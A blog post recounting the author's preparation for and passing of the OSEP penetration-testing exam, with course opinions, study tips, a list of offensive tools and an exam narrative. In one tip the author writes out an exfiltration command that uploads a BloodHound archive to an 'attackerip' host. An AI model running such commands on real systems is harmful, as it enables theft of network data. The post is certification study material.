---
layout: post
slug: passing-osep
title: my experience passing the osep cert
tags: [cert, osep, pentesting]
---

I recently passed the OSEP exam on the first attempt, achieving both independent requirements to pass: 100+ points and the slippery `secret.txt` flag. 💅

I wanted to solidify my internal pentesting skillz, since I'm generally more comfortable with web hacking. So it was a nice opportunity to learn and test myself in a challenging environment.

Here I'll share my experience preparing and pwning for this exam.

**Spoiler**: there will be no *spoilers* here. It's just my personal experience, without anything that isn't already public.

### os-what?
The [Offensive Security Experienced Pentester (OSEP)](https://www.offsec.com/courses/pen-300/) from OffSec is probably the most advanced active directory penetration testing cert, along with the [Certified Active Directory Pentesting Expert (CAPE)](https://academy.hackthebox.com/preview/certifications/htb-certified-active-directory-pentesting-expert) from HackTheBox[^1].

[PEN-300: Advanced Penetration Testing (PEN-300)](https://www.offsec.com/courses/pen-300/) is the course behind the OSEP certification, and it covers a wide range of internal penetration testing skills and techniques, including:

* develop client-side attack techniques using Microsoft Office and other common applications, including building a reliable attack vector
* master antivirus evasion methods and tools
* bypass application whitelisting mechanisms like AppLocker
* implement advanced lateral movement strategies in Windows and Linux environments
* conduct sophisticated Active Directory exploitation and attacks to uncover hidden vulnerabilities
* evade network detection systems, including IDS and IPS
* perform advanced exploitation of Microsoft SQL and Active Directory
* use advanced programming concepts and Win32 APIs for attack development

### the course
Overall, the course is pretty well put together. The content is easy to follow and goes in-depth on relevant topics. Some sections aren't strictly required for the exam, but it's super helpful to know what's under the hood.

Fun fact: I managed to [escalate a sqli to an rce](/escalating-preauth-sqli-to-rce) in a real engagement thanks to studying this cert. So just for that, I guess it was worth it, kek.

#### stuff I liked
- the network section was accurate and aligned with what I've seen in real enterprise setups.
- the demo of _why_ and _how_ the default meterpreter obfuscation gets flagged is quite good.
- the challenges' attack paths cover the course material quite organically.
- the adcs section has now been included!
- phishing via ics calendar invites was pretty interesting.
- pwning ci/cd pipelines opens a ton of possibilities for latmov.

#### stuff I didn't \*love\*
- **sometimes post-exploitation is too crazy**: once you're local admin you have too much freedom. e.g. disabling defender and/or firewall rules.
- **few OPSEC refs/considerations**, e.g. psexec usage, `net user`, etc.
- **some av bypasses are too naïve**, e.g. process hollowing by itself would be blocked by Crowdstrike or any other competent edr. That said, edr evasion is a very demanding field where you need to update constantly, and this course provides a decent baseline.
- **phishing is mostly vba macros and hta**. Both techniques are a bit outdated (e.g. macros disabled by default) and easy for any competent SOC to detect.

### reqs
IMHO, the following skills matter:
- **ad hacking**: being familiar with the concepts and common techniques.
- **programming background**: nothing crazy, but being comfortable with c# and powershell.
- **ctf experience**: if you don't have some background pwning boxes, you'll struggle.
- **windows internals**: nothing crazy, but knowing winapi, process and filesystem structure, etc.

### prep
I prepped for 1.5 months, and this was my strategy:
1. reviewed external content listed in [references](#references).
2. watched a selection of the course videos at 2x speed. Just the most challenging topics.
3. actively read the book: highlighting important stuff and taking notes on useful commands.
4. pwned the first 5 challenges. Thoroughly. Investigating all possible attack paths, e.g. dropper vs loader.
5. re-reviewed my challenge solutions and forced myself to understand \*all\* the concepts behind the techniques: if you run into a rabbit hole and treat everything as a blackbox, that's a recipe for disaster.

### r4nd0m tips
- you can compile with [mono](https://www.mono-project.com/) to avoid visual studio. I basically managed to compile everything in kali and didn't touch the windows lab machine[^3]!
- change the name of the artifacts because they don't necessarily overwrite![^2]
- updog is god. you can host files but also exfil like: `curl.exe http://attackerip/upload -F "file=@C:\Windows\tasks\20260415044445_BloodHound.zip" -F "path=./"`.
- migrate your revshell processes for stability.
- get comfortable with network pivoting.
- become best friends with your c2 of choice. I personally reviewed the [metasploit unleashed](https://www.offsec.com/metasploit-unleashed/) guide.
- read the exam guide and the exam objectives. For instance, ai chatbots, paid tools and automated exploitation are not allowed.
- IMHO, the challenges prepare you _enough_ to face the exam. Although I've heard htb rastaLabs and offshore are good prep too.
- have a plan z: there are too many variables involved, so if something fails, you need to know different alternatives.
- take good notes before and \*during\* the exam. The environment is huge and you can get lost/overwhelmed easily.

### resources
I came across a ton of resources, but here's a curated list of the most practical ones.

OSEP-specific resources sorted by subjective usefulness:
- [https://www.emmanuelsolis.com/osep.html](https://www.emmanuelsolis.com/osep.html)
- [https://github.com/OoStellarnightoO/OSEP_Notes](https://github.com/OoStellarnightoO/OSEP_Notes)
- [https://0x4rt3mis.github.io/posts/OSEP-Cheat-Sheet/](https://0x4rt3mis.github.io/posts/OSEP-Cheat-Sheet/)
- [https://github.com/darkness215/osep-tools/](https://github.com/darkness215/osep-tools/)
- [https://github.com/beauknowstech/OSEP-Everything](https://github.com/beauknowstech/OSEP-Everything)

**Important**: be aware that some of these commands and scripts are now flagged, since the osep environment gets updated over time, so don't be cocky and test everything before trying your luck on the exam.

Related off-topic resources:
- [ippsec writeups](https://ippsec.rocks)
- [goad pwning series by mayfly277](https://mayfly277.github.io/posts/GOADv2/)
- [tcm ad section of the PEH course](https://tcm-sec.com/academy/practical-ethical-hacking/)[^4].
- [orange cyberdefense ad cheatsheet](https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg)

Not required but interesting, a book on EDR evasion techniques by No Starch Press:
(img)

### my gig
Here was my arsenal of tools[^5]:
- external recon: [autorecon](https://github.com/AutoRecon/AutoRecon)
- c2: keep calm and use meterpreter (with custom C# loaders aligned with the book's content)
- clm: [bypass-clm](https://github.com/calebstewart/bypass-clm)
- obfuscation: [InvisibilityCloak](https://github.com/h4wkst3r/InvisibilityCloak) and [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-obfuscation)
- vba macros: [BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)
- file sharing: [updog](https://github.com/sc0tfree/updog). It has file upload functionality too!
- ad enum: [powerview](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) and [adpeas](https://github.com/61106960/adPEAS)
- hta: [Dotnet2JScript](https://github.com/tyranid/dotnettojscript) loading the js as an external file
- privesc: [peas-ng suite](https://github.com/peass-ng/PEASS-ng/tree/master) and [powerup](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). But honestly, I ended up doing everything manually.
- revshell: [penelope](https://github.com/brightio/penelope)
- compiler: [mono](https://www.mono-project.com/), downloading missing dll dependencies from [nuget.org](https://nuget.org)

And my kali setup:
- virtualization: [kali on qemu on debian](/kali-on-qemu-on-debian)
- reporting: [sysreptor](https://docs.sysreptor.com/offsec-reporting-with-sysreptor/).
- note taking: [obsidian](https://obsidian.md/)
- terminal: [terminator](https://gnome-terminator.org/)
- rdp client: [remmina](https://remmina.org/)
- browser extension: [Bye Bye, Google AI: Turn off Google AI Overviews, Discussions and Ads](https://chromewebstore.google.com/detail/bye-bye-google-ai-turn-of/imllolhfajlbkpheaapjocclpppchggc?pli=1)

### exam

I grabbed a monster[^6] and started the exam at 01:00 AM. I promised myself I wouldn't go to sleep until I got comfortable with the progress.

After 6 hours I had 40 points. I was feeling confident about the next steps, so I took a nap.

I woke up at 10:00 AM. Then I made a lot of progress. Not everything is linear, and effort doesn't always translate into flags. People always stress that if you're stuck, don't force it — take a walk. But I think the opposite is also true: if you're on a roll, **don't stop digging**. 🪏

Then I hit a wall after the 6th flag. So I took a walk to lower my cortisol levels. My strategy was to tryhard until day two, and if no luck, move to the second path and grab more flags.

It was quite frustrating since I had a clear idea of what I wanted to do, but somehow it didn't work. Finally, I caught it: I had missed a little syntax detail.

So after 23h I went to sleep with 9 flags in my pocket: I just needed one more. On day two, I woke up at 09:00 AM. Then I pulled `secret.txt` at 10:35 AM, which meant I met both independent criteria to pass: >=100 points and the `secret.txt`.

#### timeline

Here's a timeline of the exam progress:


### wh00t wh00t

Two days after the exam I received the beloved email. I passed!

![alt text](image.png)



[^1]: well, generalizing here — there are others like CRTO, CRTE, CRTL, etc. There's no 1-to-1 comparison since each one focuses on a different angle: evasion, c2, etc.
[^2]: Wasted hours because of this, kek.
[^3]: somehow slow AF.
[^4]: I had already purchased it when doing the PNPT cert a while ago.
[^5]: note that I've omitted the most obvious ones like `mimikatz` or `secretsdump`. Duh.
[^6]: not sponsored.